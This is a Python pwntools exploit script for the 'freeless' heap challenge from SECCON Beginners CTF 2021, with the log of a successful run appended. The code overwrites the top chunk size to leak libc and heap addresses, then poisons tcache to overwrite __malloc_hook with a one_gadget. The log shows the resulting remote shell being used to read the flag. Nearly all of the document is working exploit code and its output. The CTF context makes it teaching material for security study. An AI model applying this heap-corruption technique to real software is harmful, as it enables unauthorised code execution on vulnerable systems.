from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "freeless.quals.beginners.seccon.jp"
  PORT = 9077
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.31.so")
  one_gadget_offset = [0xe6c7e, 0xe6c81, 0xe6c84]
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  libc = elf.libc
  one_gadget_offset = [0xe6aee, 0xe6af1, 0xe6af4]
  #libc = ELF("./libc-2.31.so")

def New(idx, size):
  s.sendlineafter("> ", "1")
  s.sendlineafter("index: ", str(idx))
  s.sendlineafter("size: ", str(size))

def Edit(idx, data):
  s.sendlineafter("> ", "2")
  s.sendlineafter("index: ", str(idx))
  s.sendlineafter("data: ", data)
  
def Show(idx):
  s.sendlineafter("> ", "3")
  s.sendlineafter("index: ", str(idx))

New(0, 0x110)
Edit(0, b"A"*0x110+p64(0)+p64(0xc51)) # change top

# libc leak
New(1, 0x1000-1)
New(2, 0x110)

Show(2)
s.recvuntil("data: ")
r = s.recvuntil("\n")[:-1]
libc_leak = u64(r + b"\x00\x00")
libc_base = libc_leak - 0x1ec1d0
free_hook = libc_base + libc.sym.__free_hook
malloc_hook = libc_base + libc.sym.__malloc_hook
system_addr = libc_base + libc.sym.system
#one_gadget_offset = [0xe6ce3, 0xe6ce6, 0xe6ce9, 0xe6c81]

one_gadget  = libc_base + one_gadget_offset[1]
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# heap leak
Edit(2, "B"*0x10)
Show(2)
s.recvuntil("data: "+"B"*0x10)
r = s.recvuntil("\n")[:-1]
heap_leak = u64(r + b"\x00\x00")
heap_base = heap_leak - 0x3b0

print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

# clear unsortedbin
New(3, 0xb00)

# set tcache
New(4, 0xe00)
Edit(4, b"C"*0xe00+p64(0)+p64(0x1e1))
New(5, 0x200)

New(6, 0xc00)
Edit(6, b"D"*0xc00+p64(0)+p64(0x1e1))
New(7, 0x200)
Edit(6, b"E"*0xc00+p64(0)+p64(0x1c1)+p64(malloc_hook))

New(8, 0x1b0)
New(9, 0x1b0)

Edit(9, p64(one_gadget))
New(10, 0)

s.interactive()

'''
mito@ubuntu:~/CTF/SECCON_Beginners_CTF_2021/Pwn_freeless$ python3 solve.py r
[*] '/home/mito/CTF/SECCON_Beginners_CTF_2021/Pwn_freeless/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to freeless.quals.beginners.seccon.jp on port 9077: Done
[*] '/home/mito/CTF/SECCON_Beginners_CTF_2021/Pwn_freeless/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7fab74fea1d0
libc_base = 0x7fab74dfe000
heap_leak = 0x5609d30ff3b0
heap_base = 0x5609d30ff000
[*] Switching to interactive mode
$ id 
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls -l
total 20
-r-xr-x--- 1 root pwn 12816 May 21 01:07 chall
-r--r----- 1 root pwn    35 May 21 01:07 flag-a27a8a3700044baa57d2a91a73a4025d.txt
$ cat flag-a27a8a3700044baa57d2a91a73a4025d.txt
ctf4b{sysmalloc_wh4t_R_U_d01ng???}
'''
